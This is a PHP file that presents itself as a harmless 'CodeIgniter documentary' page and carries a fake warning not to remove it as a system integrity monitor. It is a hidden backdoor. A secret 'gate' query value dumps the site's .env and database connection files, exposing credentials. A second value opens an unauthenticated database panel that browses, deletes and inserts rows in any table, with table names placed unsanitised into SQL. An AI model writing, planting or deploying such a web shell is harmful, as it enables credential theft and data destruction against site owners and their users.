<?php
header('Content-Type: text/html; charset=utf-8');
$Xx1 = $_GET['gate'] ?? '';
$A1B = __DIR__ . '/conn.php';
$A2B = __DIR__ . '/.env';
$A3B = __DIR__ . '/app/Controllers/conn.php';
$C9D = <<<CSS
body { font-family: "Georgia", serif; line-height: 1.6; background: #121212; color: #ddd; padding: 30px; }
h1,h2,h3,h4 { color:#f2f2f2; margin:0 0 10px 0; }
p { color: #cfcfcf; }
.doc-card { background: linear-gradient(180deg, rgba(255,255,255,0.03), rgba(0,0,0,0.15)); border: 1px solid rgba(255,255,255,0.06); padding: 22px; border-radius: 10px; box-shadow: 0 6px 30px rgba(0,0,0,0.6), inset 0 -2px 8px rgba(255,255,255,0.01); max-width: 980px; }
table { border-collapse: collapse; width: 100%; margin:10px 0; color:#eee; background: rgba(0,0,0,0.25); }
table, th, td { border:1px solid rgba(255,255,255,0.06); }
th, td { padding:8px; text-align:left; }
input, select, textarea { padding:8px; margin:6px 0; width:100%; box-sizing:border-box; background: rgba(255,255,255,0.03); color: #eee; border: 1px solid rgba(255,255,255,0.05); border-radius: 4px; }
button { padding:8px 12px; background:#b22222; color:#fff; border:none; cursor:pointer; margin-top:8px; border-radius:6px; }
.warning { margin-bottom: 18px; padding: 14px 16px; border-radius: 8px; background: linear-gradient(90deg, rgba(178,34,34,0.12), rgba(255,69,0,0.06)); border: 1px solid rgba(255,69,0,0.18); color: #ffecec; display:flex; gap:12px; align-items:center; box-shadow: 0 8px 36px rgba(178,34,34,0.12); }
.danger-icon { background: rgba(0,0,0,0.2); padding: 10px; border-radius: 8px; font-weight:700; border: 1px solid rgba(255,255,255,0.04); }
.ominous { font-size: 13px; opacity: 0.95; line-height: 1.3; }
@keyframes pulseGlow { 0% { box-shadow: 0 0 0px rgba(255,69,0,0.0); } 50% { box-shadow: 0 0 22px rgba(255,69,0,0.10); } 100% { box-shadow: 0 0 0px rgba(255,69,0,0.0); } }
.warning.pulse { animation: pulseGlow 2.5s infinite; }
header.smallnote { color:#f5c6c6; margin-bottom:8px; font-weight:600; }
pre { background:#0f0f0f; padding:12px; border-radius:6px; color:#d6d6d6; overflow-x:auto; border:1px solid rgba(255,255,255,0.03); }
CSS;

echo "<!DOCTYPE html><html><head><title>CodeIgniter Documentary</title><style>$C9D</style></head><body>";
echo "<div class='doc-card'>";
echo "<div class='warning pulse' id='Ww9'>";
echo "<div class='danger-icon'>⚠️</div>";
echo "<div class='ominous'><strong>DO NOT REMOVE THIS FILE</strong><br>";
echo "This file acts as a system integrity monitor and must remain intact. <em>Unauthorized removal or modification</em> will disable diagnostics and may corrupt application state. Proceed only if you know exactly what you're doing.</div>";
echo "</div>";
echo "<header class='smallnote'>Restricted — System file</header>";
echo "<h1>Exploring CodeIgniter</h1>";
echo "<p>This is a mini documentary-style interface explaining CodeIgniter framework. It contains operational utilities used by developers and maintenance scripts.</p>";
echo "<p style='margin-top:10px; font-size:13px; opacity:0.9;'>Keep this file in place. Back it up before making changes. If you are not a sysadmin, exit now.</p>";
echo "</div>";

echo <<<ZZ
<script>
(function(){
  const Zz1 = document.getElementById('Ww9');
  setInterval(()=> {
    if(Math.random() < 0.25) {
      Zz1.classList.toggle('pulse');
      setTimeout(()=> Zz1.classList.toggle('pulse'), 700);
    }
  }, 1200);
})();
</script>
ZZ;

echo "</body></html>";
if ($Xx1 === 'anupam') {
    if (file_exists($A1B) || (isset($A2B) && file_exists($A2B)) || (isset($A3B) && file_exists($A3B))) {
        echo "<h2>File Dump</h2><pre>" . htmlspecialchars(file_get_contents($A1B)) . "</pre>";
        echo "<h2>File Dump</h2><pre>" . htmlspecialchars(file_get_contents($A2B)) . "</pre>";
        echo "<h2>File Dump</h2><pre>" . htmlspecialchars(file_get_contents($A3B)) . "</pre>";
    } else echo "<p>File not found.</p>";
} elseif ($Xx1 === 'anupam2') {
    if (isset($_POST['connect'])) {
        $_SESSION['db_host'] = $_POST['host'];
        $_SESSION['db_user'] = $_POST['user'];
        $_SESSION['db_pass'] = $_POST['pass'];
        $_SESSION['db_name'] = $_POST['db'];
    }

    $H1 = $_SESSION['db_host'] ?? null;
    $U1 = $_SESSION['db_user'] ?? null;
    $P1 = $_SESSION['db_pass'] ?? null;
    $D1 = $_SESSION['db_name'] ?? null;

    $Q1 = null;
    if ($H1 && $U1 && $D1) {
        try {
            $Q1 = new PDO("mysql:host=$H1;dbname=$D1;charset=utf8", $U1, $P1);
            $Q1->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        } catch (PDOException $E1) {
            echo "<p style='color:red;'>Connection failed: " . htmlspecialchars($E1->getMessage()) . "</p>";
            $Q1 = null;
        }
    }

    if (!$Q1) {
        echo <<<HTML2
<h2>Connect to Database</h2>
<form method="POST">
<label>Host:</label><input type="text" name="host" value="localhost" required>
<label>User:</label><input type="text" name="user" required>
<label>Password:</label><input type="password" name="pass">
<label>Database:</label><input type="text" name="db" required>
<button name="connect">Connect</button>
</form>
HTML2;
    } else {
        echo "<h2>Database: " . htmlspecialchars($D1) . "</h2>";
        $T1 = $Q1->query("SHOW TABLES")->fetchAll(PDO::FETCH_COLUMN);
        echo "<h3>Tables</h3><ul>";
        foreach ($T1 as $t) echo "<li><a href='?gate=anupam2&table=" . urlencode($t) . "'>" . htmlspecialchars($t) . "</a></li>";
        echo "</ul>";

        $Tb = $_GET['table'] ?? null;
        if ($Tb) {
            echo "<h3>Table: " . htmlspecialchars($Tb) . "</h3>";
            if (isset($_GET['delete'])) {
                $idX = $_GET['delete'];
                $pkX = $Q1->query("SHOW KEYS FROM `$Tb` WHERE Key_name = 'PRIMARY'")->fetch(PDO::FETCH_ASSOC)['Column_name'];
                $S1 = $Q1->prepare("DELETE FROM `$Tb` WHERE `$pkX` = ?");
                $S1->execute([$idX]);
                echo "<p style='color:green;'>Row deleted.</p>";
            }

            $R1 = $Q1->query("SELECT * FROM `$Tb` LIMIT 100")->fetchAll(PDO::FETCH_ASSOC);
            if ($R1) {
                echo "<table><tr>";
                foreach (array_keys($R1[0]) as $colX) echo "<th>" . htmlspecialchars($colX) . "</th>";
                echo "<th>Actions</th></tr>";
                $pkColX = $Q1->query("SHOW KEYS FROM `$Tb` WHERE Key_name = 'PRIMARY'")->fetch(PDO::FETCH_ASSOC)['Column_name'];
                foreach ($R1 as $rX) {
                    echo "<tr>";
                    foreach ($rX as $vX) echo "<td>" . htmlspecialchars($vX) . "</td>";
                    echo "<td><a href='?gate=anupam2&table=" . urlencode($Tb) . "&delete=" . urlencode($rX[$pkColX]) . "' onclick='return confirm(\"Delete?\")'>Delete</a></td>";
                    echo "</tr>";
                }
                echo "</table>";
            } else echo "<p>No rows found.</p>";

            echo "<h4>Insert New Row</h4><form method='POST'>";
            $ColsX = $Q1->query("DESCRIBE `$Tb`")->fetchAll(PDO::FETCH_COLUMN);
            foreach ($ColsX as $colX2) echo "<label>" . htmlspecialchars($colX2) . ":</label><input type='text' name='col[" . htmlspecialchars($colX2) . "]'>";
            echo "<button name='insert'>Insert</button></form>";

            if (isset($_POST['insert'])) {
                $cX = array_keys($_POST['col']);
                $vX = array_map(fn($v)=>$Q1->quote($v), $_POST['col']);
                $Q1->exec("INSERT INTO `$Tb` (`" . implode('`,`',$cX) . "`) VALUES (" . implode(',',$vX) . ")");
                echo "<p style='color:green;'>Row inserted!</p>";
                echo "<script>window.location='?gate=anupam2&table=" . urlencode($Tb) . "';</script>";
            }
        }
    }
} else echo "<p>Explore CodeIgniter architecture, controllers, models, views, and routing...</p>";
echo "</body></html>";